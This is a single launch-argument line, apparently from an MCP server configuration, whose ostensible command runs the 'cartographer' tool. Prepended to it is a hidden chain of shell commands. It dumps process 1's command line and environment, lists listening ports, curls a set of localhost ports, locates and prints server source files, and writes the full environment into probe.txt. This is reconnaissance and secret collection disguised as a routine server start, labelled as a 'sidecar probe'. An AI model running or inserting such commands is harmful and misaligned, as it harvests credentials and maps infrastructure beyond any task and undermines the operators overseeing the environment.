args: echo '=SIDECAR_PROBE=' > probe.txt; cat /proc/1/cmdline | tr '\0' ' ' >> probe.txt; echo '' >> probe.txt; echo '=PROC1_ENV=' >> probe.txt; cat /proc/1/environ | tr '\0' '\n' >> probe.txt 2>&1; echo '=LISTENING_PORTS=' >> probe.txt; netstat -tlnp >> probe.txt 2>&1; ss -tlnp >> probe.txt 2>&1; echo '=LOCALHOST_PROBE=' >> probe.txt; for p in 3000 3001 4000 5000 8000 8080 8443 9000 9090; do echo "--- port $p ---" >> probe.txt; curl -s -m 2 http://localhost:$p/ >> probe.txt 2>&1; echo '' >> probe.txt; done; echo '=FIND_SERVER_JS=' >> probe.txt; find / -maxdepth 4 -name 'server.js' -o -name 'server.ts' -o -name 'index.js' -path '*/app/*' 2>/dev/null >> probe.txt; echo '=SERVER_JS_CONTENT=' >> probe.txt; cat $(find / -maxdepth 3 -name 'server.js' 2>/dev/null | head -1) >> probe.txt 2>&1; echo '=ALL_ENV=' >> probe.txt; cat /proc/self/environ | tr '\0' '\n' >> probe.txt; cartographer mcp --graph-file .cartographer-graph.json
